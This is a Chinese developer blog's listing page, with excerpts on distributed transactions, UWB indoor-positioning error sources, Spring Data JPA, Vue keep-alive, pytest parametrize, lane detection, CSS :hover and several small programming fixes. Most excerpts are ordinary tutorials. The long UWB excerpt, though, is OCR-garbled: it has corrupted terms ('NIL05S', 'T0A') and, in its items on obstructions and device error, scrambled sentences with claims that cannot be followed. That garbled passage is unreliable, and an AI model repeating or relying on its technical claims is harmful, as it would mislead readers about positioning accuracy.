		分布式事务 1.什么是事务 访问并更新数据库中各种数据项的一个程序执行单元
通俗一点说就是，一手交钱一手交货，要么钱货两清，要么终止交易
2.什么是本地事务 通常我们使用关系型数据库来控制事务（是数据库本身的能力），数据库事务，应用程序主要靠关系型数据库来控制事务，通常单体架构中，数据库跟应用程序是在一起的（同一个服务器），所以基于关系型数据库的事务，又被称为本地事务
3.spring如何接管本地事务 使用：1.配置文件 2.注解
核心是阻止了原来返回的connection，返回了自己的connection
4.事务的ACID 原子性（atomicity）：一个事务是一个不可分割的工作单位，事务中包括的操作要么都做，要么都不做。
一致性（consistency）：事务必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。
隔离性（isolation）：一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。
持久性（durability）：持久性也称永久性（permanence），指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。
5.CAP C：一致性：从数据库必须等待主数据库数据同步完成，才能给客户响应（过程阻塞）
A：可用性：我现在可以先返回就的数据给用户（从故武器没有获取主服务器最新的数据）
P：分区容错性：高可用，分布式系统中的任何一个节点挂了，都不影响其他节点
典型应用场景
CP：银行取钱
AP：准备发货中，支付中
6.BASE理论 BASE理论是对CAP中的一致性和可用性进行一个权衡的结果，理论的核心思想就是：我们无法做到强一致性，但每个应用都可以根据自身的业务特点，采用适当的方式来使西永达到最终一致性
BASE理论是Basically Available，基本可用，Soft State，软状态，状态可以有一段时间不同步，Eventually Consistent，最终一致，最终数据是一致的就可以了，而不是时时保持强一致。
7.什么是分布式事务 百度百科 - 分布式事务是指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的分布式系统的不同节点之上
通俗来说：需要远程协助才能操作的事务，称之为分布式事务
8.分布式事务常见解决方案 2pc/3pc tcc at mq sage
二阶段提交（英文缩写：2pc）
在分布式系统中，每个节点虽然可以知晓自己的操作成功或失败，但不知晓其他节点的成功或失败
第一阶段请求阶段
1 协调者（Coordinator，即事务管理器）会向事务的参与者（Cohort，即本地资源管理器）发起执行操作的 CanCommit 请求，并等待参与者的响应.
2 参与者接收到请求后，会执行请求中的事务操作，记录日志信息(包含事务执行前的镜像)，同时锁定当前记录。参与者执行成功，则向协调者发送“Yes”消息，表示同意操作；若不成功，则发送“No”消息，表示终止操作。
3 当所有的参与者都返回了操作结果（Yes 或 No 消息）后，系统进入了提交阶段。
第二阶段提交阶段
协调者会根据所有参与者返回的信息向参与者发送 DoCommit 或 DoAbort 指令
若协调者收到的都是“Yes”消息，则向参与者发送“DoCommit”消息，参与者会完成剩余的操作并释放资源，然后向协调者返回“HaveCommitted”消息；
如果协调者收到的消息中包含“No”消息，则向所有参与者发送“DoAbort”消息，此时发送“Yes”的参与者则会根据之前执行操作时的回滚日志对操作进行回滚，然后所有参与者会向协调者发送“HaveCommitted”消息；
协调者接收到“HaveCommitted”消息，就意味着整个事务结束了。
二阶段提交的实现 - XA
三阶段提交，也叫三阶段提交协议（英文缩写3pc）
是在计算机网络及数据库的范畴下，使得一个分布式系统内的所有节点能够执行事务的提交的一种分布式算法。三阶段提交是为解决两阶段提交协议的缺点而设计的。
TCC：try，confirm，cancel
tcc补偿机制
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfa8a4e2516b72735d1d64138bdad68c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7be55525c17576b86784cfa51752219/" rel="bookmark">
			UWB系统的定位精度影响因素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		UWB系统的定位精度影响因素
影响UWB定位精度的因素较多，主要包括:多径效应、非视距传播、多址干扰、参考基站数量、参考基站位置和时钟同步误差等因素。
(1)多径效应
超宽带信号在室内传播过程中受到复杂的室内环境( 如墙体、窗体及室内障碍物等)的影响，会发生反射、折射等情况从而产生多径效应。多径效应会导致信号经过不同的路径到达定位基站天线的情况各异，使得第一一个到达的信号分量不是直线传输到达的信号分量，显示出不同的时间和空间方位。此时，信号到达定位基站的各分量之间的相位关系会发生改变，不同的路径也会使各量具有不同的时延，微小的时延导致信号各分量相互干涉，从而引起信号的快衰减与能量衰减，信噪比下降，最终导致测量误差，定位精度也随之降低。多径效应对RSSI和AOA等非时间测距的定位算法会产生很大的影响，而对于基于时间测量的定位算法T0A/TDOA,也会引起测量值的偏差，可见多径效应是影响定位精度的主要原因之一。因此，要尽可能地抑制 多径效应将能有效地提高定位精度，目前抑制多径效应的方法主要是关于时延估计的算法，如基于边缘检测的时间延迟估计14与基于遗传粒子滤波的多径时延估计算法
(2)非视距传播
当目标节点与参考基站之间的直射路径被障碍物遮挡后，发射点和接收点之间就不存在直达路径了，无线电信号只能经过反射或折射后才能抵达接收端，这种现象被称为非视距传播(NL0S)。 传统的TOA算法是检测最强脉冲来得到传输时何的，但是当非视距信号到达接收端时，此时第一个到达脉冲并不是最强的脉冲，使得TOA算法存在误差。基于角度测量的AOA算法因为NIL05S 误差的影响，得到的角度测量值与真实值之间也无法避免地存在着较大误差。在实际室内定位过程中，经实验证明，由TOA算法得到的测量值的方差在NLOS环境下比在L.05环境下的值大10，因此我们可以利用这种差别来甄别是否为NIOS环境，然后利用简单的L.0S重建算法就可以减少定位误差的产生。另一种减小误差的方法是使用有偏或无脑卡尔曼滤波的方式对实际测量值进行筛选，从而使得待测节点取得较高的定位精度
(3) 多址干扰
由于参考基站需要协同定位，因此某个参考基站不光要接收待定位节点发射过来的信号，还要接收临近基站的发射信号。不同的信号叠加在一起就造成了信号的干扰，降低了信号的信噪比，使测得的T0A值与真实值相差较大。解决的办法是: a)采用相互正交的即时序列，使得用户在不同的时候进行信号的传输，从而避免用户间干扰: b)在接收端使用一个匹配速波器，对多址信道内的扩频信号进行输出，然后根据有效的信号处理方法最终判断恢安出原址的方法送信号数据，这种方法也能够在一定程度上消除远近效应的影响。
(4)参考基站数量
增加参考基站的数目可以增加T0A测量值的信息冗余度，降低定位的误差，提高定位的精确度。但定位基站的数量不是越多越好，当定位参考基站的数目增加到定程度时， 无法充分利用其他基站提供的距离信息。在实际的应用当中，考虑到计算速度和成本，按照经验般参考基站的数量为4-6个。
(5) 参考基站位置
合理地设置参考基站的位置可以在一定程度上 上抑制多址干扰，提高定位的精度。参考基站与待定位节点的相对位置的关系对定位系统影响的程度可以用几何精度因子(Goumetie Dhution o Pecsin, GDOP)来表示。在实际的应用当中，在从大量的参考基站选择基站时，可以用CDOP作为选择指标。阅读有关的文献可知，均匀分布的基站比无序分布的参考基站有着更好的定位效果。
(6)时钟同步误差
基于T0A和TDOA的超宽带定位算法所使用的时钟同步是不相同的，精于TOA的定位不仅要求待定位节点和各个参考基站间有严格的时钟同步，而且也要求参考基站间保持时钟同步。而基于TDOA定位时仅仅需要各多考基站间时钟同步即可，这样就减少了定位系统的复杂度和成本。因此，时钟同步误差与定位精度有着密切关系。时钟同步过程中会受到多方面因素的影响。1)时钟设备质量的可靠性，例如信号收发设备的精度过低，在测量过程中可能会产生较大的测量误差，另外，品体振荡器自身存在的温漂、老化等问题也会使时钟发生偏移。2)时钟同步算法，主要分为有线时钟同步和无线时钟同步，不同的时钟同步算法的精度是不同的，相比于有线时钟同步算法，无线时钟同步算法在应用上更为方便，但是相对而言同步的难度更大”。3)同步范围，由信号传输的路径报耗规律可知，信号的传输距离并不是无限远的，-定的发射功率也限定了-定的信号可用范围，因此时钟的同步范围大致可以分为单区域同步和跨区域同步。单区域时钟同步，顾名思义，在特定的区域内进行时钟同步，单区域时钟同步会受到所要同步的区域形状的影响;跨区域时钟同步则会受到相邻同步区域的时钟同步误差累积影响，即与原始时钟越远的区域时钟同步误差越大。4)时钟同步的环境，例如信号的收发过程是否受到干扰，信号传输环境是否为NLOS等。因此，受这些因素的影响，容易造成不理想的时钟同步情况，不理想的时钟同步会带来一定的时钟误差， 从而影响到定位精度和定位稳定性。引起UWB测距误差的原因有多个，室内定位节点之间的本地时钟不同源导致时间同步上的误差，该误差可以通过TDOA测距方式消除:影响测距误差的还有系统误差，系统误差一般包括天线延迟误差、经纬度、环境湿度以及海拔等因素的影响，可以通过线性拟合的方式来消除部分系统误差，为了使最后的定位更加准确，在正式实验定位之前，需要进行测距预处理工作，以此来提高后期的定位精度:影响测距精度的原因还有另外一个，测距方式的不同，也可能导致最后的定位精度有差异，可以使用的测距方式为双向对称测市，而非双向测距。这可以提高定位精度。TDOA测量误差、时钟偏差、基站数量与位置、随机遮档、设备误差和气象条件等典型误差特征。 TDOA测量误差现有技术方案中，为了解决对TDOA测量误差的校正需要引入测量参考设备，典型的校正系统由一个参考发射设备和两个参考接收设备构成，参考发射设备和参考接收设备的位置已知。由参考发射设备发送特殊的测量信号，参考接收设备在收到测量信号后，可以获得TDOA的测量结果。然后利用已知的参考设备的位置信息，计算出TDOA的理论值。对比TDOA的测量结果和计算结果，可获得TDOA的测量误差信息。利用多个参考发射设备可以得到多个测量误差估计结果，对所有测量误差估计结果进行加权平均处理后，在后续的TDOA测量过程中，采用加权平均处理获得的误差信息对测量结果进行校正。根据对TDOA测量误差来源的分析，参考设备校正过程获得的误差信息做加权平均处理后，不具备普遍代表性，校正获得的精度提高有限"(2)时钟偏差时钟偏差可以通过校准源校正，且存在与否对定位性能界有影响，噪声水平多大对于稳健的算法而言是无影响的。(3)基站数量与位置1) 数量:基站位置误差噪声水平是影响定位性能的重要因素， 基于TDOA最小二乘算法，在不考虑其他误差的情况下，分析了基站几何布局对定位终嘴的误差影响，可以看出较好的基站几何布局能够大大提高移动台的定位精度。在可得到多基站信号特征值的情况下，可以根据多基站选择算法来选择具有较好几何布局的基站来进行定位，有助于利用较少的系统资源得到较好的定位精度。此外还可以根据不同的定位需求，指导基站的架设。对于Chan定位算法，在高斯噪声环境下，陆着参与定位的基站数的增加，能够利用的TDOA测量值的数目增加，可以得到更高的定位精度。当参与定位的基站数达到5个及以上后，定位精度改变不大，也就是说，利用TDOA测量值的定位算法，需愛多与定位的基站至少为3个，当参与定位的基站达到5个以上时，定位性能达到最优。
位置:根据仿真模拟，当基站数量较多时，集合分布按照蜂窝型布置时，定位误差最小。
(4)随机遮挡(无线电波的衍射与反射)在室内定位中，室内的意挡物对UWB技术产生多大的影响呢?
1)实体墙:一堵实体墙的这种速挡将使得UwB信号衰减60% -70%，定位精度误差上升30cm左右，两堵或者两堵以上的实体墙遮挡，将使得UWB无法定位。
2)钢板:钢铁对UWB脉冲信号吸收很严重，将使得UWB无法定位。
3)玻璃:玻璃遮挡对UWB定位精度没太大的影响。
4)木板或纸板。鹏厚度10cm左右的木板或纸板对UwB定位精度没大大电线杆或者书面遮挡时需要看他们之间距离基站或者标的影响。
5)电线杆或树木，林签的相对面离比较是否很小，比如，基站和定位标签的签的距离，与基站和标插期不正好在两者中间25m处，这种遮挡就没有大的影距离为s0m，电线杆或者树本正好新为国非站成标资距离很近小于m，影响就很大。设备误差卫星发射设备及及用户接收设备的电路延时(这些电路延时随环境因素、电出工作条件、 元件名化、信号和干批占中的强弱而变化)，将产生固定的及限机净的制防设发此外，计算机进行定位计算也会有计算误差，从而导致定位误差。
(6)气象条件
1)温度和气乐等因素对测距精度的影响呈线性变化，气压的影响最为显著.其次是温度。
2)从温度对测距精度的影响曲线可以看出，距离一定时， 随着温度的增加，对测距精度呈正梯度:随着作用距离的增加，温度的影响进步增大。
3)从压力对测距精度的影响曲线可以看出，距离一定时， 随着压力的增加，对测距精度呈负梯度:随着作用距离的增大，其影响程度进一步 加图。
4)固定温度、压力和湿度，距离对测距精度的影响呈负梯度变化。
(7) 大气
现有技术中，在视距情况下，基于UWB实时高精度室内定位之所以会导致精度下降，主要是由于当基站和标签距离较远时，受大气误差延迟的干扰严重，增加了UWB信号到达时间。因此，没有办法准确地计算出基站与标签的距离通过∪WB设备得到标签与基站之间的测量距离，通过基站和标签之间的测量距离建立观测方程;在所述观测方程中引入与测量距离成正比例的大气误差参数:通过三角定位的方法将位置参数与大气误差参数起进行补偿解算， 从而消除大气中信号传播的大气干扰造成的误差:解算得出消除大气误差后的误差
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e9d4027f1cdeb0195600b72be196b9d/" rel="bookmark">
			jpa的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是jpa？
spring data jpa
springboot演示jpa
1.pom依赖
2.application.properties 配置
3.建立用户实体类
4. 声明 UserRepository接口，继承JpaRepository
5.定义测试类，演示添加操作
6.查询
什么是jpa？ JPA是Java Persistence API的简称，中文名Java持久层API， 是 Sun 官方提出的 Java 持久化规范。它为 Java 开发人员提供了一种对象/ 关联映射工具来管理 Java 应用中的关系数据。 他的出现主要是为了简化现有的持久化开发工作和整合 ORM 技术。
spring data jpa Spring Data JPA 是 Spring 基于 ORM 框架、JPA 规范的基础上封装的一套 JPA 应用框架，底层使用了 Hibernate 的 JPA 技术实现， 可使开发者用极简的代码即可实现对数据的访问和操作。 它提供了包括增删改查等在内的常用功能， 且易于扩展！学习并使用 Spring Data JPA 可以极大提高开发效率。
springboot演示jpa 1.pom依赖 &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.45&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt; &lt;/dependency&gt; 2.application.properties 配置 spring.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e9d4027f1cdeb0195600b72be196b9d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/924f0ae8bc2c426ad13a57fb6f09050c/" rel="bookmark">
			keep-alive的使用及详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.概念 keep-alive 是 Vue 的内置组件，当它包裹动态组件时，会缓存不活动的组件实例，而不是销毁它们。和 transition 相似，keep-alive 是一个抽象组件：它自身不会渲染成一个 DOM 元素，也不会出现在父组件链中。
二.作用 在组件切换过程中将状态保留在内存中，防止重复渲染DOM，减少加载时间及性能消耗，提高用户体验性。
三.Props include - 字符串或正则表达式。只有名称匹配的组件会被缓存。exclude - 字符串或正则表达式。任何名称匹配的组件都不会被缓存。max - 数字。最多可以缓存多少组件实例 四. 生命周期 当组件在 &lt;keep-alive&gt; 内被切换，它的 activated 和 deactivated 这两个生命周期钩子函数将会被对应执行。
1. activated
在 keep-alive 组件激活时调用
使用 keep-alive 会将数据保留在内存中，如果要在每次进入页面的时候获取最新的数据，需要在 activated 阶段获取数据，承担原来 created 钩子函数中获取数据的任务
2.deactivated
注意： 只有组件被 keep-alive 包裹时，这两个生命周期函数才会被调用，如果作为正常组件使用，是不会被调用的，以及在 2.1.0 版本之后，使用 exclude 排除之后，就算被包裹在 keep-alive 中，这两个钩子函数依然不会被调用！另外，在服务端渲染时，此钩子函数也不会被调用
五.用法 1.缓存所有页面 &lt;template&gt; &lt;div id="app"&gt; &lt;keep-alive&gt; &lt;router-view/&gt; &lt;/keep-alive&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: 'App' } &lt;/script&gt; 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/924f0ae8bc2c426ad13a57fb6f09050c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fdffc45ce69cf4e39a28ef0407d36e1/" rel="bookmark">
			阻抗匹配及其方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、阻抗匹配：信号在传输过程中，为避免发生信号反射干扰，要求传输线的特征阻抗与负载阻抗一致；
2、基本阻抗匹配原则：单端走线控制阻抗为50Ω，差分走线控制阻抗为100Ω；
3、阻抗匹配方法：阻抗匹配四种处理方式_pan0755的博客-CSDN博客_阻抗匹配的方法
4、一般串接匹配电阻在阻抗匹配实际应用中最多。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10de411654ad16abf36e0028f4f214f1/" rel="bookmark">
			CVPR2022车道线检测Efficient Lane Detection via Curve Modeling
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分享前段时间看的一篇车道线检测方向的新工作，也是中了最近公开结果的2022CVPR，是上海交大、华东师大、香港城市大学和商汤科技合作完成的，代码已经开源。关于车道线检测任务，我之前也分享过几篇文章：
相关链接（点击进入）：
车道线检测综述及近期新工作
https://blog.csdn.net/qq_41590635/article/details/117386286
车道线检测新工作VIL-100: A New Dataset and A Baseline Model for Video Instance Lane Detection ICCV2021
https://blog.csdn.net/qq_41590635/article/details/120335328
自动驾驶视觉感知之语义分割+车道线检测demo
https://mp.weixin.qq.com/s/gS-pZyhdq4f-jRJo9MjY8Q
论文链接:
https://arxiv.org/abs/2203.02431
代码链接:
https://github.com/voldemortX/pytorch-auto-drive
简介 Lane detection strategies 如上图所示，基于深度学习的车道线检测方法可分为三大类：基于分割的方案（图中绿色示例）、基于点检测的方案（图中蓝色示例）和基于多项式曲线的方案（图中黄色示例）。
其中基于分割和点检测的方案一般效果性能更好，但基于分割方案和基于点检测方案的表征是局部的、间接的，且在多项式曲线中的抽象因子(a, b, c, d)难于优化。为此，文章提出了基于三次B´ezier 曲线的方案，即上图中的红色曲线和虚线框，因为贝塞尔曲线具有易于计算、稳定、转换自由等特点。此外，作者也设计了基于可形变卷积的特征翻转融合模块，进行车道线对称属性的探究。
最终文章的方案在保持高速度（&gt;150FPS）和小尺寸（&lt;10M）的同时，在车道线检测基准数据集LLAMAS上取得了新的SOTA表现，同时在TuSimple和CULane数据集上取得了竞争力的精度表现。
B´ezier 曲线相关补充 贝塞尔曲线（以3阶为例）是依据四个位置任意的点坐标绘制出的一条光滑曲线。其通过控制曲线上的四个点（起始点、终止点以及两个相互分离的中间点）来创造、编辑图形。其中起重要作用的是位于曲线中央的控制线。这条线是虚拟的，中间与贝塞尔曲线交叉，两端是控制端点。移动两端的端点时贝塞尔曲线改变曲线的曲率（弯曲的程度）；移动中间点（也就是移动虚拟的控制线）时，贝塞尔曲线在起始点和终止点锁定的情况下做均匀移动。
对于任意阶贝塞尔曲线，可通过以下公式进行表示：
文章也对贝塞尔曲线和多项式方程曲线进行了对比实验，如下表所示，表中指标是TuSimple测试集上的结果，越低越好。
通过上述实验，文章选择使用经典的3阶贝塞尔曲线(n=3), 因为实验中发现3阶足够用来进行车道线建模，同时与3阶多项式曲线相比具有更好的拟合能力，而3阶多项式曲线是之前众多方案中的基础方程（论文中如此说），实际小汤在自己参与的部分工作及和同行交流中得知，目前各家实际量产中的方案也大都为3阶多项式曲线方案。文章也指出更高阶的曲线并没有带来相应的性能提升，但却会由于高自由度而造成不稳定性。
The Proposed Architecture 对于输入的RGB图像，经过特征提取得到的特征图送入特征翻转融合模块，得到 CxH/16xW/16 大小的特征图，再经过平均池化得到的CxW/16的特征图，最后经过一个分类和一个回归分支得到相应的贝塞尔曲线结果。
Feature Flip Fusion
特征翻转模块是文章的主要工作之一。
通过对车道线作为历史曲线来建模，文章集中于各条车道线的几何特性，如瘦、长、连续等特性。当从前视相机的角度来考虑车道线的全局结构事，道路具有空间等分的车道线，近似于对称，例如。左边车道线的存在可能暗示其右侧存在对应的车道线。文章对这种对称性进行建模，为此设计了特征翻转模块。
an auxiliary binary segmentation branch
文章还在ResNet backbone上设计了一个额外的二分类分割分支，旨在加强对于空间细节的学习。并通过实验发现这个额外的分支只有在和特征翻转融合模块一起工作时才起作用。这是因为分割任务的定位有利于提供一个空间上更准确的特征图，这个反过来支持翻转特征图之间更准确融合。
这个额外的二分类分割分支只在训练时使用，推理时关掉。
文章通过上图所示的Grad-CAM可视化效果对这一设计的影响进行了说明，详细细节可以阅读原文。
Overall Loss 因为在车道线检测数据集中，并不存在正负样本不平衡问题，所以分类和分割都使用了简单的加权交叉熵损失。
Experiments Results on test set of CULane and TuSimple.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10de411654ad16abf36e0028f4f214f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e9d5a807588a8a3f41062c71f0b3594/" rel="bookmark">
			【pytest】(详解)@pytest.mark.parametrize: 参数化测试函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1.快速入门1.1介绍1.2代码示例1.3运行结果1.4结果分析 2.装饰测试类2.1介绍2.2示例代码2.3.运行结果2.4结果分析 3.全局变量方式进行参数化3.1介绍3.2示例代码3.3运行结果3.4结果分析 4.标记参数化4.1介绍4.2示例代码4.3运行结果4.4结果分析 5.堆叠parametrize装饰器5.1介绍5.2示例代码5.3运行结果5.4结果分析 6.参数为字典的方式6.1介绍6.2示例代码6.3运行结果6.4结果分析 7.ids参数用例描述7.1介绍7.2示例代码7.3运行结果7.4结果分析 8.解决unicode编码问题8.1问题描述8.2解决方法一:通过配置pytest.ini处理8.3解决方法二:通过钩子函数pytest_collection_modifyitems解决 9.基于pytest_generate_tests钩子函数的参数化9.1介绍9.2示例代码9.3运行结果 跟着官网学习的,记录记录笔记.
1.快速入门 1.1介绍 以前使用unittest的时候,我们参数化是用@ddt,但是使用pytest之后,pytest内置了pytest.mark.parametrize装饰器来对测试函数的参数进行参数化
1.2代码示例 文件名: test_demo.py
import pytest @pytest.mark.parametrize("test_input,expected", [("3+5", 8), ("2+4", 6), ("6*9", 42)]) def test_eval(test_input, expected): assert eval(test_input) == expected 1.3运行结果 1.4结果分析 我们通过@parametrize装饰器定义了三个不同的(test_input,expected)的元祖,然后test_eval函数就依次使用了他们三次.这就是一个简单的参数化使用案例.
2.装饰测试类 2.1介绍 我们可以对类进行参数化,但这限制比较高,比如你类下面的所有函数,参数名称和个数都要和你写的参数名称个数一致,否则就会报错.
2.2示例代码 文件名: test_demo.py
import pytest @pytest.mark.parametrize("name,age,sex", [("微光", 18, "男"), ("杨过", 20, "男"), ("小龙女", 27, "女")]) class TestDemo: def test_demo01(self, name, age, sex): print(name, age, sex) # def test_demo02(self, sex): # print(sex) # def test_demo03(self): # print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e9d5a807588a8a3f41062c71f0b3594/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b660fb2c2656db33c306e7dab3f03ef/" rel="bookmark">
			yield数据集生成器用法学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一，简单yield方法。 假如我都数据集是一个列表[0,1,2,3,4,5,6,7,8,9]。
需求：
打乱顺序，相当于随机取数。一轮取完，重新打乱顺序，继续取数。无穷无尽。 def test_yeild(): np.random.shuffle(a) for j in range(10): yield a[j] if __name__ == '__main__': a = list(range(10)) while True: for i in test_yeild(): print(i) print("finish***") 下面是pytorch的自带的图像数据集cifar10的处理方法。
import numpy as np import _pickle as pickle def unpickle(file): fo = open(file, 'rb') dict = pickle.load(fo, encoding='bytes') fo.close() return dict[b'data'] def cifar_generator(filenames, batch_size, data_dir): all_data = [] for filename in filenames: all_data.append(unpickle(data_dir + '/' + filename)) images = np.concatenate(all_data, axis=0) def get_epoch(): np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b660fb2c2656db33c306e7dab3f03ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bc922e0c68d5fe91256ea8bbc90b382/" rel="bookmark">
			Snipaste安装教程及软件（截图工具）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、软件下载 Snipaste是一个功能强大的免费开源截图工具，支持自定义快捷键、主题色、界面字体等，也可以让你将截图贴回到屏幕上！你还可以将剪贴板里的文字或者颜色信息转化为图片窗口，并且将它们进行缩放、旋转、翻转、设为半透明。如果你是程序员、设计师，或者是大部分工作时间都在电脑前，贴图功能将改变你的工作方式、提升工作效率。Snipaste 使用很简单，但同时也有一些较高级的用法可以进一步提升你的工作效率。如果想要深入了解学习，可以读一读 用户手册 。Snipaste很安全，没有广告、不会扫描你的硬盘、不会上传用户数据，它是一款特别实用的截图软件。
如果要下载Snipaste软件 请到 博主主页的资源栏中找到“Snipaste（截图软件）”进行下载哦。记得解压后回到页面看安装教程哦。
（本软件为 免安装 类型哦）
二、安装步骤 1.解压文件后，打开文件，找到“Snipaste.exe”，根据下图提示创建桌面快捷方式。
2.双击桌面图标，在桌面右下角状态栏中可以找到软件图标，鼠标右键点击，选择首选项可以设置相关功能选项。
3.不同的选项对应不同功能的调整，可以根据需求进行设置。如下快捷键设置。
4.如下所示常规设置。
5.如下所示截图设置。
6.如下所示，贴图设置。
7.如下所示，输出设置。
写在后面：
如果你的软件不是免安装类型的，可以去下载哦。这款截图软件很实用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18fa5c4d1b17607344cf633748593a86/" rel="bookmark">
			最大回文乘积(C语言)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		回文数就是从前往后读和从后往前读都一样的数。由两个位数相乘得到的最大的回文数是 9009 = 91 * 99。
求由两个位数相乘得到的最大的回文数。
#include &lt;stdio.h&gt; // 判断是否是回文数 int func (int x) { // t 是x倒转之后的结果 int t = 0, r = x; while(x != 0) { t = t * 10 + x % 10; x /= 10; } return t == r; } int main () { int ans = 0; for (int i = 100; i &lt; 1000; i++) { for(int j = i; j &lt; 1000; j++) { int t = j * i; if(func(t)) { // 最大的回文乘积 if(ans &lt; t) { ans = t; } } } } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18fa5c4d1b17607344cf633748593a86/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ef8dee679a6f10d6cb95222808fbba6/" rel="bookmark">
			CSS:hover常见问题及用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
hover定义
hover用法
hover问题
后记
hover定义 :hover 选择器用于选择鼠标指针浮动在上面的元素
hover用法 控制自身样式 &lt;div class="aa"&gt;&lt;/div&gt; &lt;style&gt; aa:hover { background-color:yellow; } &lt;/style&gt; 父元素控制子元素 &lt;div class="parent"&gt; &lt;div class="child"&gt;&lt;/div&gt; &lt;/div&gt; &lt;style&gt; parent:hover child{ //鼠标经过父元素时，改变子元素背景色 background:#000; } &lt;/style&gt; 控制同级元素样式 &lt;div class="doc1"&gt;&lt;/div&gt; &lt;div class="doc2"&gt;&lt;/div&gt; &lt;style&gt; doc1:hover +doc2 { //鼠标经过doc1元素时，改变doc2元素背景色 //注意：不能通过doc2元素改变doc1元素 background:#000; } &lt;/style&gt; hover问题 active，visited，hover，link之间的生效顺序的关系。使用了中文的标识符。在设置:hover前，增加来空格，导致只对其后代有效。存在hover的元素的行内式样式，效果不显示。控制同级元素样式时，hover只对相邻元素有效（下一个紧挨着的元素，上一个元素不能被控制）。 后记 借鉴自：
css之伪类hover改变自身、子元素、其他元素的样式_Boale_H的博客-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd42997574e915785d993def8fb7bd47/" rel="bookmark">
			python 颜色调整（饼状图）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python画图常用颜色_珠穆拉玛峰的博客-CSDN博客_python画图颜色
文字、图片颜色调整。
方式1： \textcolor{red}{text}
方式2：\textcolor[rgb]{0.5, 0.5,0}{text} (0-1)
方式3：\textcolor[RGB]{105, 0,0}{text} (0-255)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c4c2b3a9512e9f9a8052856c9298030/" rel="bookmark">
			服务器报错 Error: Failed to synchronize cache for repo ‘AppStream‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主最近在学习部署服务器，并且把自己的项目传到服务器上与前端联调
在部署阿里云环境时 (CentOS 8)，用yum 命令安装命令时报错：
Error: Failed to synchronize cache for repo ‘AppStream’
问题：应该是源的问题，博主自己去网上搜索之后找到了解决办法，亲测有效，已经为其他小伙伴解决了一样的问题，但是我们使用的都是阿里云的服务器
第一步：进入要修改的文件目录下
cd /etc/yum.repos.d 第二步：修改两个文件
vim CentOS-Base.repo 按照下图修改
vim CentOS-AppStream.repo 按照下图修改
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25d28a8a7e2542ea642a50453da8f42e/" rel="bookmark">
			原因:无法将 ‘＜＞‘ 与非泛型类LinkedList一起使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在执行以下代码是遇到如下错误 1.问题 执行代码
import java.util.List; import java.util.LinkedList; public class LinkedList { public static void main(String[] args) { List&lt;String&gt; list = new LinkedList&lt;&gt;(); //添加元素 list.add("a"); list.add("b"); list.add("c"); list.add("a"); //获取元素 for(int i=0;i&lt;list.size();i++){ System.out.println(list.get(i)); } System.out.println("-------------------"); for(String str :list){ System.out.println(str); } } } &lt;&gt; 这里爆红
